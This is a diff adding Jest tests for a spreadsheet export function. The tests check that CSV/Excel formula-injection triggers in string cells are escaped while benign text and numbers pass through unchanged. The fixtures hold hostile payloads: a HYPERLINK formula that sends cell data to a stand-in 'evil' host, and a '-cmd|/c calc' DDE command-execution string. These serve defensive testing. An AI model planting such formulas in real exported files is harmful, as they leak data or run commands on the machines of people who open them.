@@ -90,4 +90,42 @@ describe("exportToExcel", () => {
     const [, , sheetName] = bookAppendSheet.mock.calls[0];
     expect(sheetName).toBe("Dados");
   });
+
+  it("neutralises CSV/Excel formula triggers in string cells", async () => {
+    const { exportToExcel } = await import("@/lib/export");
+    const headers = ["Contador", "Nota", "Endereco", "Tipo", "Tab", "Cr", "Score"];
+    const rows: ExportRow[] = [{
+      Contador: "=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
+      Nota: "+1234567",
+      Endereco: "-cmd|/c calc",
+      Tipo: "@SUM(A1:A2)",
+      Tab: "\tinjected",
+      Cr: "\rinjected",
+      Score: 85,
+    }];
+
+    exportToExcel("test", headers, rows);
+
+    const [data] = jsonToSheet.mock.calls[0];
+    expect(data[0].Contador).toBe("'=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")");
+    expect(data[0].Nota).toBe("'+1234567");
+    expect(data[0].Endereco).toBe("'-cmd|/c calc");
+    expect(data[0].Tipo).toBe("'@SUM(A1:A2)");
+    expect(data[0].Tab).toBe("'\tinjected");
+    expect(data[0].Cr).toBe("'\rinjected");
+    // Numbers are passed through untouched.
+    expect(data[0].Score).toBe(85);
+  });
+
+  it("does not modify benign string cells", async () => {
+    const { exportToExcel } = await import("@/lib/export");
+    const headers = ["Nome", "Morada"];
+    const rows: ExportRow[] = [{ Nome: "Maria João", Morada: "Rua das Flores 12" }];
+
+    exportToExcel("test", headers, rows);
+
+    const [data] = jsonToSheet.mock.calls[0];
+    expect(data[0].Nome).toBe("Maria João");
+    expect(data[0].Morada).toBe("Rua das Flores 12");
+  });
 });
